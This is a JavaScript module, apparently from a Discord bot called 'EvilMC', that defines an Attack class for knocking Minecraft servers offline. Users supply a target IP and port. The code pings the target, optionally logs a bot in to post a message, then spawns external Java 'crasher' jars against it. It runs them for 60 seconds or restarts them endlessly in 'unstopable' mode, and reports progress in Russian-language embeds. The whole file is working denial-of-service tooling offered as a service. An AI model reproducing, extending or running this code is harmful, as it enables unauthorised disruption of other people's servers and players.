const Discord = require('discord.js');
const Client = require('./client.js');
const child = require('child_process');
const killPrc = require('tree-kill');
const crashers = require('../functions/crashers.js');
const mineflayer = require('mineflayer');
const config = require('../jsons/config.json');
const mp = require('minecraft-protocol');

class Attack {
    /**
     * @typedef {{client: Client, interaction: Discord.CommandInteraction, jaroptions: {jarname: string, jarargs: string}, AttacksArray: Discord.Collection<string, Attack>, ownerID: string, msgID: string, embed: Discord.EmbedBuilder, host: string, port: string, method: string, unstopable: boolean, crashPrc: child.ChildProcess, pid: Number}} AttackOptions
     * @param {AttackOptions} options 
     */
    constructor(options) {
        this.client = options.client,
            this.interaction = options.interaction,
            this.jaroptions = options.jaroptions,
            this.AttacksArray = options.AttacksArray,
            this.ownerID = options.ownerID,
            this.msgID = options.msgID,
            this.embed = options.embed,
            this.host = options.host,
            this.port = options.port,
            this.method = options.method,
            this.unstopable = options.unstopable,
            this.crashPrc = options.crashPrc,
            this.pid = options.pid

            if (config.autoResolver && !this.port) {
                try {
                    crashers.autoResolver(this.host).then((host, port) => {
                        this.host = host;
                        this.port = port;
                        this.prepareAttack();
                    })

                } catch { }
            } else this.prepareAttack();
    }

    async runJar() {
        try {
            let crash = child.exec(`java -jar jars/${this.jaroptions.jarname} ${this.jaroptions.jarargs}`, { detached: true }, (error, stdout, stderr) => {
                if (stderr) {
                    console.log(`StdErr: ${stderr}`);
                    return;
                }
                console.log(`[Attack log] ${stdout}`);
            })

            this.crashPrc = crash;
            this.pid = crash.pid;

            if (this.unstopable) {
                crash.on("exit", (code, signal) => {
                    this.runJar();
                })
            }
        } catch (err) {
            await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, err);
        }
    }

    /**
     * Отправление сообщения на сервер
     * @param {String} msg 
     */
    async sendMsgToServer(msg) {
        const bot = mineflayer.createBot({
            username: config.msgToServer.botName,
            host: this.host,
            port: this.port
        })

        bot.on('login', () => {
            bot.chat(`/register ${config.msgToServer.botPass} ${config.msgToServer.botPass}`);
            bot.chat(`/login ${config.msgToServer.botPass}`);
            bot.chat(msg);
            bot.quit();
        })

        bot.on('end', async (reason) => {
            console.log('[LOG] Bot leave from minecraft server');
        })
    }

    async prepareAttack() {
        console.log(this.host);
        mp.ping({ host: this.host, port: this.port ? this.port : undefined }, async (err, result) => {
            if (result) {
                this.jaroptions.jarargs = this.jaroptions.jarargs.replace(/%HOST%/g, this.host).replace(/%PORT%/g, this.port ? this.port : 25565)

                this.embed = new Discord.EmbedBuilder()
                    .setColor('Random')
                    .setFooter({
                        text: `${this.interaction.guild.name} | EvilMC`,
                        iconURL: this.client.user.avatarURL({ dynamic: true })
                    });

                let runembed;

                if (config.msgToServer.enable) {
                    runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port ? this.port : 25565} \n \n  ► Атака запускается... \n ☆ Made with ♥ by DesConnet ☆`);

                    this.interaction.editReply({ embeds: [runembed] })
                    await this.sendMsgToServer(config.msgToServer.msg).then(() => {
                        this.runAttack();
                    })
                } else {
                    this.runAttack();
                }
            } else {
                console.log(err);
                this.AttacksArray.delete(this.msgID, this);
                return await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, "**Время ожидания отклика сервера вышло.**\n\nВозможные причины:\n```1.Сервер выключен\n2.IP и/или Порт введены некоректно.\n3.Боту не удалось пропинговать майнкрафт сервер из-за пустого порта```\n\nПроверьте правильность введенного IP, Порта и повторите попытку.", true);
            }
        })
    };

    async runAttack() {
        let runembed;
        const port = this.port || 25565;
        console.log(`[LOG] Была запущена атака: ${this.method}\n[LOG] Название jar: ${this.jaroptions.jarname}\n[LOG] Аргументы jar: ${this.jaroptions.jarargs}\n[LOG] Запустил атаку: ${this.ownerID}`);
        await this.runJar();

        try {
            if (this.unstopable == false) {
                runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${port} \n \n  ► Атака запущена! ✅ \n ► На 60 секунд!!\n ☆ Made with ♥ by DesConnet ☆`);

                this.interaction.editReply({ embeds: [runembed] })

                setTimeout(async () => await this.stopAttack(), 60000)
            } else {
                runembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${port} \n \n  ► Атака запущена! ✅ \n ► До тех пор пока вы не нажмете остановить!!\n ☆ Made with ♥ by DesConnet ☆`);

                const stopBtn = new Discord.ButtonBuilder()
                    .setCustomId("stopAttack")
                    .setLabel("Остановить")
                    .setStyle(Discord.ButtonStyle.Danger);

                this.interaction.editReply({ embeds: [runembed], components: [new Discord.ActionRowBuilder({ components: [stopBtn] })], fetchReply: true })
            }
        } catch (err) {
            await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, err, true);
        }
    }

    async stopAttack() {
        console.log(`[LOG] Атака ${this.method} запущенная ${this.ownerID} была остановлена`);
        try {
            killPrc(this.pid);
            const endembed = this.embed.setDescription(`**► Метод: ${this.method}** \n \n **► Информация** \n IP: ${this.host} \n Port: ${this.port} \n \n ► Атака Завершена!\n ☆ Made with ♥ by DesConnet ☆`);
            this.interaction.editReply({ embeds: [endembed], components: [] });
            this.crashPrc.removeAllListeners();
            this.AttacksArray.delete(this.msgID, this);
        } catch (err) {
            await crashers.errorembed(this.client, this.interaction, this.interaction.commandName, err);
        }
    };
}

module.exports = Attack;
